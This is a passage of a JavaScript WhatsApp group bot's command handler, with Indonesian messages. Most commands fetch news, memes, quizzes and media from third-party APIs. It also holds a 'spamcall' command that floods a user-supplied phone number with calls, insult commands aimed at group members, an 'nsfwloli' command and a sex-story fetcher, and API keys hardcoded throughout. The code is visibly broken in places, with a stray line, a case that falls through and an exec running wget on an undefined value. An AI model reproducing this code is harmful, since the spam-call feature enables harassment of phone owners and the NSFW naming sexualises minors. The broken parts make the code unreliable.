${anu.result.Data.CNH.Jual}\n*CNH Beli* : ${anu.result.Data.CNH.Beli}\n*==========*\n*MYR Jual* : ${anu.result.Data.MYR.Jual}\n*MYR Beli* : ${anu.result.Data.MYR.Beli}\n*==========*\n*THB Jual* : ${anu.result.Data.THB.Jual}\n*THB Beli* : ${anu.result.Data.THB.Beli}\n*==========*\n`
					Angga.sendMessage(from, hasil, text, {quoted: mek})
					await limitAdd(sender)
					break
		case 'githubstalk':
					if (!isRegistered) return reply(ind.noregis())
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/github/${body.slice(13)}?apikey=KatoNiBoss`, {method: 'get'})
					get_result = get_result.result
					txt = `Full : ${get_result.name}\n`
					txt += `Followers : ${get_result.followers}\n`
					txt += `Following : ${get_result.following}\n`
					txt += `Publick : ${get_result.public_repos}\n`
					txt += `Public Gits : ${get_result.public_gists}\n`
					txt += `User : ${get_result.user}\n`
					txt += `Compi : ${get_result.company}\n`
					txt += `Lokasi : ${get_result.location}\n`
					txt += `Email : ${get_result.email}\n`
					txt += `Bio : ${get_result.bio}\n`
					buffer = await getBuffer(get_result.avatar)
					Angga.sendMessage(from, buffer, image, {quoted: mek, caption: txt})
					break
                case 'slap':
					kapankah = body.slice(1)
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					const slap =['anjing','babi lu','anak anjing','udah tolol nub Lagi','muka lo kek monyet','udah jomblo sendirian lagi dirumah tolol','so so an mau punya pacar muka aja kek monyet lepass dari kandang','ganteng doang di toxic aja dibilang baperan','pantek kau','bangsat kau','ku entod kalian nangis kau','anjing lu semua','lihat anak anjing lagi baca','ganteng doang jemput cewe dipanggang','kamu cantik beb bullshit anjing cowo buaya','anak setan','puki lu','anjing ngajak gelud','sama hantu takut cupu bangsat','cupu cupu aja gausah bacot','bangsat lu semua','bocah lu semua bangsat','3 Hari Lagi']
					const ple = slap[Math.floor(Math.random() * slap.length)]
					pod = await getBuffer(`https://media.giphy.com/media/S8507sBJm1598XnsgD/source.gif`)
					Angga.sendMessage(from, pod, image, { quoted: mek, caption: '*Toxic*\n\n'+ ple })
					await limitAdd(sender)
					break
		case 'tampar':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					buffer = await getBuffer('https://media.giphy.com/media/S8507sBJm1598XnsgD/source.gif', {method: 'get'})
					exec(`wget ${buffer.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(rano)
						Angga.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender)
					break
                case 'tribunews':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/tribunews?apikey=apivinz`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Judul* : ${i.title}\n*Time* : ${i.time}\n*Link* : ${i.url}\n*Keterangan* : ${i.ket}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
			    case 'liputan6': 
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/liputan6?apikey=apivinz`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Judul* : ${i.title}\n*Url* : ${i.url}\n*Keterangan* : ${i.ket}\n*Category* : ${i.category}\n*Time* : ${i.time}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
				case 'foxnews': 
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/foxnews?apikey=apivinz`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Judul* : ${i.title}\n*Url* : ${i.url}\n*Country* : ${i.country}\n*Content* : ${i.content}\n*Time* : ${i.time}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
				case 'nickff': 
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/nickepep?apikey=apivinz`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Nick* : ${i}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
				case 'newsinfo': 
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`http://lolhuman.herokuapp.com/api/newsinfo?apikey=${LoLKey}`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Source:* : ${i.source.name}\n*Author* : ${i.author}\n*Title* : ${i.title}\n*Description* : ${i.description}\n*Url* : ${i.url}\n*Published At* : ${i.publishedAt}\n*Content* : ${i.content}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
				case 'film': 	
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/film/2?q=${body.slice(6)}&apikey=apivinz`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
				case 'film2': 	
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/film/2?q=${body.slice(6)}&apikey=apivinz`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
					case 'searchfilm':
               
                pshh = `${body.slice(12)}`
                  anu = await fetchJson(`https://api.zeks.xyz/api/film/2?q=${pshh}&apikey=apivinz`, {method: 'get'})
                  puree = '======================\n'
                  for (let plyll of anu.result){
                  puree += `• *Judul:* ${plyll.title}\n• *Link:* ${plyll.url}\n=====================\n`
                  }
                  reply(puree.trim())
                  break
                case 'beritahoax':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://docs-jojo.herokuapp.com/api/infohoax`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Gambar* : ${i.image}\n*Title* : ${i.title}\n*link* : ${i.link}\n*tag* : ${i.tag}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break 
		case 'trendtwit':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					data = await fetchJson(`https://api.vhtear.com/trendtwitter?country=indonesia&apikey=c1d162b46e634f389efa1ac715f03d03`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Hastag* : ${i.hastag}\n*link* : ${i.link}\n*rank* : ${i.rank}\n*Tweet* : ${i.tweet}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
		case 'setppbot':
					if (!isOwner) return reply(ind.ownerb())
					Angga.updatePresence(from, Presence.composing) 
					if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
					enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Angga.downloadAndSaveMediaMessage(enmedia)
					await Angga.updateProfilePicture(botNumber, media)
					reply('Makasih profil barunya😗')
					break 
					case prefix+ 'setfake1':
					case prefix+ 'setowhshaner':
			        if (mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					fakee = q
		case 'setppbott':
				if (!isAdmin) return reply('*Only Admin bot*')
					Angga.updatePresence(from, Presence.composing) 
					if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
					enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Angga.downloadAndSaveMediaMessage(enmedia)
					await Angga.updateProfilePicture(botNumber, media)
					reply('Makasih profil barunya😗')
					break 
		case 'brainly':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					brien = body.slice(9)
					brainly(`${brien}`).then(res => {
					teks = '❉───────────❉\n'
					for (let Y of res.data) {
						teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉───────────❉\n`
					}
					Angga.sendMessage(from, teks, text, {quoted: mek, detectLinks: false})
					console.log(res)
					})
					await limitAdd(sender)
					break 
		case 'bcgc':
					if (!isOwner) return reply(ind.ownerb())
					if (args.length < 1) return reply('.......')
					anu = await groupMembers 
					tagss = mek.participant
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buffer = await Angga.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Angga.sendMessage(_.jid, buffer, image, {caption: `*「 BC GROUP 」*\n\nDari Grup : ${groupName}\nPengirim : wa.me/${(sender.split('@')[0])}\nPesan : ${body.slice(6)}`})
						}
						reply('')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `*「 BROADCAST GROUP 」*\n\nDari Grup : ${groupName}\nPengirim : wa.me/${(sender.split('@')[0])}\nPesan : ${body.slice(6)}`)
						}
						reply('Sukses broadcast group')
					}
					break 
		case 'pinterest':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					Angga.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=${body.slice(11)}`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					Angga.sendMessage(from, pok, image, { quoted: mek, caption: `*PINTEREST*`})
					await limitAdd(sender)
					break 
           case 'glitchtext':
					
					var gh = body.slice(12)
					var gli = gh.split("/")[0];
					var tch = gh.split("/")[1];
					if (args.length < 1) return reply(`ã€Œâ—ã€Contoh : ${prefix}glitchtext AnggaGanzz/Gans`)
					reply(ind.wait())
					buffer = await getBuffer(`https://api.zeks.xyz/api/gtext?text1=${gli}&text2=${tch}&apikey=apivinz`)
					Angga.sendMessage(from, buffer, image, {quoted: mek})
					await limitAdd(sender)
				break
           case 'waifu':
			        
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.shizukaa.xyz/api/waifu?apikey=itsmeiky633`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					Angga.sendMessage(from, buffer, image, {quoted: mek })
					await limitAdd(sender) 
					break
           case 'randombts':
			        
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.shizukaa.xyz/api/randombts?apikey=itsmeiky633`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					Angga.sendMessage(from, buffer, image, {quoted: mek })
					await limitAdd(sender) 
					break
					case 'cogan2':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
                                        gatauda = body.slice(7)
					reply(ind.wait())
                                        anu = await fetchJson(`https://api.lolhuman.xyz/api/random/cogan?apikey=${LoLKey}`, {method: 'get'})
                                        buffer = await getBuffer(anu.result)
                                        Angga.sendMessage(from, buffer, image, {quoted: mek})
					await limitAdd(sender)
                                        break
		 case 'cogan':
			        
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.lolhuman.xyz/api/random/cogan?apikey=${LoLKey}`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					Angga.sendMessage(from, buffer, image, {quoted: mek })
					await limitAdd(sender) 
					break
					
           case 'randomexo':
			        
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.shizukaa.xyz/api/randomexo?apikey=itsmeiky633`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					Angga.sendMessage(from, buffer, image, {quoted: mek })
					await limitAdd(sender) 
					break
           case 'blackpink':
			        
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.shizukaa.xyz/api/blackpink?apikey=itsmeiky633`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					Angga.sendMessage(from, buffer, image, {quoted: mek })
					await limitAdd(sender) 
					break
				case 'faktaunik':
                case 'katabijak':
                if (!isRegistered) return reply(ind.noregis())
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/random/${command}?apikey=${LoLKey}`)
                    reply(get_result.result)
                    break
                    case 'quotesanime':
		if (!isRegistered) return reply(ind.noregis())
                    quotes = await fetchJson(`http://api.lolhuman.xyz/api/random/quotesnime?apikey=${LoLKey}`)
                    quotes = quotes.result
                    quote = quotes.quote
                    char = quotes.character
                    anime = quotes.anime
                    episode = quotes.episode
                    reply(`_${quote}_\n\n*â€• ${char}*\n*â€• ${anime} ${episode}*`)
                    break
                case 'quotesAnggan':
		if (!isRegistered) return reply(ind.noregis())
                    quoteAnggan = await fetchJson(`http://api.lolhuman.xyz/api/quotes/Anggan?apikey=${LoLKey}`)
                    reply(quoteAnggan.result)
                    break
                case 'quotesimage':
		if (!isRegistered) return reply(ind.noregis())
		buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/random/quotesimage?apikey=KatoNiBoss`)
		Angga.sendMessage(from, buffer, image, { quoted: mek})
		break
		         case 'babi':
			        
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
                 const gshizuka = await Angga.getGroupMembersId(groupId)
                 let gmik = gshizuka[Math.floor(Math.random() * gshizuka.length)]
                 const mmkk = `YANG PALING BABI DISINI ADALAH @${gmik.replace(/@c.us/g, '')}`
                 Angga.sendTextWithMentions(dari, mmkk, id)
                 break
				case 'tebakbendera':
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/tebak/bendera?apikey=${LoLKey}`, {method: 'get'})
					anu.result = anu.result.result
					jawab3 = `*Jawabannya*\n\n>${anu.result.name}`
					tebakbender = `*bendera apa ini?*\n\n>[${anu.result.flag}]`
					setTimeout( () => {
					reply(jawab3)
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					reply('_10 detik lagi_') // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					reply('_20 detik lagi_')// ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					reply('_30 detik lagi_') // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					reply(tebakbender) // ur cods
					}, 0) // 1000 = 1s,
					break 
                case 'tebakgambar': 
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/gambar?apikey=${LoLKey}`)
                    get_result = get_result.result
                    ini_image = get_result.image
                    jawaban = get_result.answer
                    ini_buffer = await getBuffer(ini_image)
                    await Angga.sendMessage(from, ini_buffer, image, { quoted: mek, caption: "Jawab gk? Jawab lahhh, masa enggak. 30 detik cukup kan? gk cukup pulang aja" }).then(() => {
                        tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
                        fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                      sleep(30000)
                    })
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
                    	                        setTimeout( () => {
					reply('_10 detik lagi_') // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					reply('_20 detik lagi_')// ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					reply('_30 detik lagi_') // ur cods
					}, 2500) // 1000 = 1s,
                        reply("Jawaban: " + jawaban)
                        delete tebakgambar[sender.split('@')[0]]
                        fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                    }
                    break
                case 'canceltebak':
                    if (!tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Anda tidak memiliki tebak gambar sebelumnya")
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                    reply("Success mengcancel tebak gambar sebelumnya")
                    break
				case 'family100':
					if (!isRegistered) return reply(ind.noregis())
					anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/family100?apikey=${LoLKey}`, {method: 'get'})
					jawab = `*Jawabannya*\n\n>${anu.result.aswer}`
					family = `*Pertanyaan*\n\n*_${anu.result.question}_*`
					setTimeout( () => {
					reply(jawab)
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					reply('_10 detik lagi_') // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					reply('_20 detik lagi_')// ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					reply('_30 detik lagi_') // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					reply(family) // ur cods
					}, 0) // 1000 = 1s,
					break
					case 'kicktime':
			if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply(ind.baned())
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Perintah di terima, mengeluarkan :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						 Angga.groupRemove(from, mentioned)
					} else {
						setTimeout( () => {
						mentions(`otw kick bosku, kita kasi waktu dulu siap bro? : @${mentioned[0].split('@')[0]}`, mentioned, true)
						}, 0) // 100 = 5s,
					setTimeout( () => {
					 Angga.groupRemove(from, mentioned, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 5s,
					setTimeout( () => {
					 Angga.sendMessage(from, '_selamat tinggal Titip gorengan Ya jangan Balik Lagi...._', text) // ur cods
					}, 20000) // 1000 = 5s,
					setTimeout( () => {
					 Angga.sendMessage(from, '_ucapkan selamat tinggal mmwaah muwwah..._', text) // ur cods
					}, 10000) // 1000 = 5s,
					setTimeout( () => {
					 Angga.sendMessage(from, '_ciiee calon bakalan dikick..._', text) // ur cods
					}, 1000) // 1000 = 5s,
					setTimeout( () => {
					 Angga.sendMessage(from, '_siap siap ya bot Kick nih_', text, { quoted: mek }) // ur cods
					}, 0) // 1000 = 10s,
					}
					break
					case 'caklontong':
					if (!isRegistered) return reply(ind.noregis())
					anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/caklontong?apikey=${LoLKey}`, {method: 'get'})
					jawab2 = `*Jawabannya*\n\n>${anu.result.answer}`
					caklontong = `*Pertanyaan*\n\n•*_${anu.result.question}_*`
					setTimeout( () => {
					reply(jawab2)
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					reply('_10 detik lagi_') // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					reply('_20 detik lagi_')// ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					reply('_30 detik lagi_') // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					reply(caklontong) // ur cods
					}, 0) // 1000 = 1s,
					break 
		case 'spamcall':
			        
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
			call = `${body.slice(11)}`
			anu = await fetchJson(`https://videfikri.com/api/call/?nohp=${call}`, {method: 'get'})
			Angga.sendMessage(from, `${anu.result.logs}`, text, {quoted: mek })
			await limitAdd(sender) 
			break  
				case 'wiki':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tahu`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wiki?apikey=${LoLKey}&query=${query}`)
                    get_result = get_result.result
                    reply(get_result)
                    break
               case 'ytmp4':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
                    ini_link = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytvideo?apikey=${LoLKey}&url=${ini_link}`)
                    get_result = get_result.result
                    asu2 = `
─────────────────────
◪ *YOUTUBE DOWNLOAD*
│
└ ❏ Judul: *${get_result.title}*
    ❏ Chanel: *${get_result.uploader}*
    ❏ Durasi: ${get_result.duration}
    ❏ Viewers: *${get_result.view}*
    ❏ Tipe: *${command}*
─────────────────────`
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    Angga.sendMessage(from, ini_buffer, image, { quoted: mek, caption: asu2, contextInfo: { forwardingScore: 2, isForwarded: true} })
                    get_audio = await getBuffer(get_result.link[0].link)
                    Angga.sendMessage(from, get_audio, video, { mimetype: 'video/mp4', filename: `${get_result.title}.mp4`, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
                    break
			case 'ytmp3':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
                    ini_link = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytaudio?apikey=${LoLKey}&url=${ini_link}`)
                    get_result = get_result.result
                    asu = `
─────────────────────
◪ *YOUTUBE DOWNLOAD*
│
└ ❏ Judul: *${get_result.title}*
    ❏ Chanel: *${get_result.uploader}*
    ❏ Durasi: ${get_result.duration}
    ❏ Viewers: *${get_result.view}*
    ❏ Tipe: *${command}*
─────────────────────`
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    Angga.sendMessage(from, ini_buffer, image, { quoted: mek, caption: asu, contextInfo: { forwardingScore: 508, isForwarded: true}})
                    get_audio = await getBuffer(get_result.link[3].link)
                    Angga.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', ptt:true, filename: `${get_result.title}.mp3`, quoted: mek, duration: 99999999999, contextInfo: { forwardingScore: 508, isForwarded: true}})
                    break
			 case 'nsfwloli':
				    try {
			        
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
						if (!isNsfw) return reply(' *FALSE* ')
						res = await fetchJson(`https://api.shizukaa.xyz/api/neko?apikey=itsmeiky633`, {method: 'get'})
						buffer = await getBuffer(res.neko)
						Angga.sendMessage(from, buffer, image, {quoted: shizuka, caption: 'Jangan jadiin bahan buat comli om'})
					    } catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply(' *ERROR* ')
					    }
					    await limitAdd(sender)
					    break
		case 'hilih': 
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (args.length < 1) return reply('kasih teks lah^_^!!!')
					anu = await fetchJson(`https://api.zeks.xyz/api/hilihmaker?text=${body.slice(7)}&apikey=apivinz`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender)
					break
		case 'holoh': 
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (args.length < 1) return reply('kasih teks lah^_^!!!')
					anu = await fetchJson(`https://a.apimau.ga/vokal?vokal=o&teks=${body.slice(7)}`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender)
					break
		case 'halah': 
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (args.length < 1) return reply('kasih teks lah^_^!!!')
					anu = await fetchJson(`https://a.apimau.ga/vokal?vokal=a&teks=${body.slice(7)}`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender)
					break
		case 'huluh': 
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (args.length < 1) return reply('kasih teks lah^_^!!!')
					anu = await fetchJson(`https://a.apimau.ga/vokal?vokal=u&teks=${body.slice(7)}`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender)
					break
		case 'heleh': 
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (args.length < 1) return reply('kasih teks lah^_^!!!')
					anu = await fetchJson(`https://a.apimau.ga/vokal?vokal=e&teks=${body.slice(7)}`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender)
					break
		case 'hurufterbalik': 
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					
                 if (!isRegistered) return reply( ind.noregis())
					gatauda = body.slice(14)
					anu = await fetchJson(`https://videfikri.com/api/hurufterbalik/?query=${gatauda}`, {method: 'get'})
					reply(anu.result.kata)
					await limitAdd(sender)
					break
		case 'lirik': 
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					
                 if (!isRegistered) return reply( ind.noregis())
					teks = body.slice(6)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/lirik?q=${teks}&apikey=${TobzKey}`, {method: 'get'})
					reply('Lirik dari lagu '+teks+' adalah :\n\n'+anu.result.lirik)
					await limitAdd(sender)
					break
		case 'alay':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (args.length < 1) return reply('kasih teks lah^_^!!!')
					data = await fetchJson(`https://api.zeks.xyz/api/alaymaker?kata=${body.slice(6)}&apikey=apivinz`)
					reply(data.result)
				        await limitAdd(sender)
					break
		l
		case 'fml':	// Fixed By Yogiツ & FxSx
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					data = await fetchJson(`https://tobz-api.herokuapp.com/api/randomfmylife?apikey=${TobzKey}`)
					hasil = data.result
					reply(hasil)
					await limitAdd(sender)
					break	
		case 'chord':
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (args.length < 1) return reply('Judul lagunya mana kak')
					tels = body.slice(7)					
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/chord?q=${tels}&apikey=${TobzKey}`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender)
					break
		case 'katacinta':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					gatauda = body.slice(8)
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/katacinta`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender)
					break
		case 'pantun':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					gatauda = body.slice(8)					
					anu = await fetchJson(`https://api.zeks.xyz/api/pantun?apikey=apivinz`, {method: 'get'})
					reply(anu.result.pantun)
					await limitAdd(sender)
					break
		case 'cersex': 
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					gatauda = body.slice(8)					
					anu = await fetchJson(`https://api.vhtear.com/cerita_sex&apikey=c1d162b46e634f389efa1ac715f03d03`, {method: 'get'})
					reply(anu.result.cerita)
					await limitAdd(sender)
					break
		case 'jadwaltv':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					gatauda = body.slice(10)					
